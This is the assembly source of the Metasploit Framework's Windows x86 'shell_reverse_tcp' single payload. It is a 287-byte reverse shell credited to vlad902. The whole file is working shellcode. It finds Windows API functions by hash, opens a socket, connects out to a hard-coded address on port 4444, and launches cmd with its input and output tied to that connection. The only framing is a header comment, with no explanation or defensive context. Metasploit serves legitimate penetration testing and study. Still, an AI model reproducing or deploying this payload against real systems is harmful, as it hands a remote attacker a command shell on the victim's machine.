;
; Metasploit Framework
; http://www.metasploit.com
;
; Source for shell_reverse_tcp (single)
;
; Authors: vlad902 <vlad902@gmail.com>
; Size   : 287
;

cld
push byte -0x15
dec ebp
call 0x2
pusha
mov ebp,[esp+0x24]
mov eax,[ebp+0x3c]
mov edi,[ebp+eax+0x78]
add edi,ebp
mov ecx,[edi+0x18]
mov ebx,[edi+0x20]
add ebx,ebp
dec ecx
mov esi,[ebx+ecx*4]
add esi,ebp
xor eax,eax
cdq
lodsb
test al,al
jz 0x34
ror edx,0xd
add edx,eax
jmp short 0x28
cmp edx,[esp+0x28]
jnz 0x1f
mov ebx,[edi+0x24]
add ebx,ebp
mov cx,[ebx+ecx*2]
mov ebx,[edi+0x1c]
add ebx,ebp
add ebp,[ebx+ecx*4]
mov [esp+0x1c],ebp
popa
ret
xor ebx,ebx
mov eax,[fs:ebx+0x30]
mov eax,[eax+0xc]
mov esi,[eax+0x1c]
lodsd
mov eax,[eax+0x8]
pop esi
push dword 0xec0e4e8e
push eax
call esi
push bx
push word 0x3233
push dword 0x5f327377
push esp
call eax
push dword 0x3bfcedcb
push eax
call esi
pop edi
mov ebp,esp
sub bp,0x208
push ebp
push byte +0x2
call eax
push dword 0xadf509d9
push edi
call esi
push ebx
push ebx
push ebx
push ebx
inc ebx
push ebx
inc ebx
push ebx
call eax
push dword 0xffffffff
push word 0x5c11
push bx
mov ecx,esp
xchg eax,ebp
push dword 0x60aaf9ec
push edi
call esi
push byte +0x10
push ecx
push ebp
call eax
o16 push byte +0x64
push word 0x6d63
push byte +0x50
pop ecx
sub esp,ecx
mov edi,esp
push byte +0x44
mov edx,esp
xor eax,eax
rep stosb
xchg eax,ebp
mov ebp,edi
inc byte [edx+0x2d]
inc byte [edx+0x2c]
lea edi,[edx+0x38]
stosd
stosd
stosd
push dword 0x16b3fe72
push dword [ebp+0x28]
call esi
pop ebx
push edi
push edx
push ecx
push ecx
push ecx
push byte +0x1
push ecx
push ecx
push ebp
push ecx
call eax
push dword 0xce05d9ad
push ebx
call esi
push byte -0x1
push dword [edi]
call eax
push dword 0x79c679e7
push dword [ebp+0x4]
call esi
push dword [edi-0x4]
call eax
push dword 0x5f048af0
push ebx
call esi
call eax
